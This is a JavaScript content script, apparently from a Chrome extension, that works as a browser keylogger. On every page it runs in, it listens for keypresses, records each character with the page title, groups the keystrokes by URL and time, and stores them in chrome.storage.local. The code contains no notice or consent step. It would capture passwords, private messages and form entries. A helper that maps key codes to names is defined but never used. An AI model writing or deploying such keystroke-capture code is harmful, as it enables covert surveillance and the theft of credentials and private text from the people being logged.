/*
e.view.document.URL
e.view.document.lastModified
e.view.which/keyCode //keycode

*/

var lastURL = "";
var lastTime = "";
var monthNames = [ "January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December" ];
var json = {};

function save(value) {
	chrome.storage.local.set({today: value});
}

function utc() {
	return new Date().getTime();
}

function getKey(event) {
	charCode = event.keyCode;
	if ((charCode > 47 && charCode < 91) || charCode == 32) { //Keyboard letters and numbers 
		return (event.shiftKey ? String.fromCharCode(charCode) : String.fromCharCode(charCode).toLowerCase());
	} else { //Symbols and whatnot
		if (charCode == 8) {
			return "[BACKSPACE]"; //  backspace
		} else if (charCode == 9) {
			return "[TAB]"; //  tab
		} else if (charCode == 13) {
			return "[ENTER]"; //  enter
		} else if (charCode == 16) {
			return "[SHIFT]"; //  shift
		} else if (charCode == 17) {
			return "[CTRL]"; //  ctrl
		} else if (charCode == 18) {
			return "[ALT]"; //  alt
		} else if (charCode == 19) {
			return "[PAUSE/BREAK]"; //  pause/break
		} else if (charCode == 20) {
			return "[CAPS LOCK]"; //  caps lock
		} else if (charCode == 27) {
			return "[ESC]"; //  escape
		} else if (charCode == 33) {
			return "[PG UP]"; // page up, to avoid displaying alternate character and confusing people	         
		} else if (charCode == 34) {
			return "[PG DOWN]"; // page down
		} else if (charCode == 35) {
			return "[END]"; // end
		} else if (charCode == 36) {
			return "[HOME]"; // home
		} else if (charCode == 37) {
			return "[LEFT]"; // left arrow
		} else if (charCode == 38) {
			return "[UP]"; // up arrow
		} else if (charCode == 39) {
			return "[RIGHT]"; // right arrow
		} else if (charCode == 40) {
			return "[DOWN]"; // down arrow
		} else if (charCode == 45) {
			return "[INSERT]"; // insert
		} else if (charCode == 46) {
			return "[DELETE]"; // delete
		} else if (charCode == 91) {
			return "[L WINDOW]"; // left window
		} else if (charCode == 92) {
			return "[R WINDOW]"; // right window
		} else if (charCode == 93) {
			return "[SELECT]"; // select key
		} else if (charCode == 96) {
			return "[NUM 0]"; // numpad 0
		} else if (charCode == 97) {
			return "[NUM 1]"; // numpad 1
		} else if (charCode == 98) {
			return "[NUM 2]"; // numpad 2
		} else if (charCode == 99) {
			return "[NUM 3]"; // numpad 3
		} else if (charCode == 100) {
			return "[NUM 4]"; // numpad 4
		} else if (charCode == 101) {
			return "[NUM 5]"; // numpad 5
		} else if (charCode == 102) {
			return "[NUM 6]"; // numpad 6
		} else if (charCode == 103) {
			return "[NUM 7]"; // numpad 7
		} else if (charCode == 104) {
			return "[NUM 8]"; // numpad 8
		} else if (charCode == 105) {
			return "[NUM 9]"; // numpad 9
		} else if (charCode == 106) {
			return "[MULTIPLY]"; // multiply
		} else if (charCode == 107) {
			return "[ADD]"; // add
		} else if (charCode == 109) {
			return "[SUBTRACT]"; // subtract
		} else if (charCode == 110) {
			return "[DECIMAL PNT]"; // decimal point
		} else if (charCode == 111) {
			return "[DIVIDE]"; // divide
		} else if (charCode == 112) {
			return "F1"; // F1
		} else if (charCode == 113) {
			return "F2"; // F2
		} else if (charCode == 114) {
			return "F3"; // F3
		} else if (charCode == 115) {
			return "F4"; // F4
		} else if (charCode == 116) {
			return "F5"; // F5
		} else if (charCode == 117) {
			return "F6"; // F6
		} else if (charCode == 118) {
			return "F7"; // F7
		} else if (charCode == 119) {
			return "F8"; // F8
		} else if (charCode == 120) {
			return "F9"; // F9
		} else if (charCode == 121) {
			return "F10"; // F10
		} else if (charCode == 122) {
			return "F11"; // F11
		} else if (charCode == 123) {
			return "F12"; // F12
		} else if (charCode == 144) {
			return "[NUM LOCK]"; // num lock
		} else if (charCode == 145) {
			return "[SCROLL LOCK]"; // scroll lock
		} else if (charCode == 186) {
			return ";"; // semi-colon
		} else if (charCode == 187) {
			return "="; // equal-sign
		} else if (charCode == 188) {
			return ","; // comma
		} else if (charCode == 189) {
			return "-"; // dash
		} else if (charCode == 190) {
			return "."; // period
		} else if (charCode == 191) {
			return "/"; // forward slash
		} else if (charCode == 192) {
			return "`"; // grave accent
		} else if (charCode == 219) {
			return "["; // open bracket
		} else if (charCode == 220) {
			return "\\"; // back slash
		} else if (charCode == 221) {
			return "]"; // close bracket
		} else if (charCode == 222) {
			return "'"; // single quote
		} else {
			return " "
		}
	}
}

function now() {
	var date = new Date();
	return date.getDate() + " " + monthNames[date.getMonth()] + " " + date.getFullYear() + " " + (date.getHours()+1) + ":" + date.getMinutes() + ":" + date.getSeconds();
}

function today() {
	var date = new Date();
	return date.getDate() + " " + monthNames[date.getMonth()] + " " + date.getFullYear();
}

document.addEventListener('keypress', function (e) {
	//key = getKey(e);
	key = (e.shiftKey ? String.fromCharCode(e.keyCode) : String.fromCharCode(e.keyCode).toLowerCase());
	if (e.view.document.URL != lastURL) { // Keys depend on URL's, new URL = new key
		lastURL = e.view.document.URL;
		lastTime = utc();
		json[lastTime] = e.view.document.title + "^~^" + key;
	} else { // Append to existing key
		json[lastTime] += key;
	}
	chrome.storage.local.set(json, function() { console.log(key, e); });
});
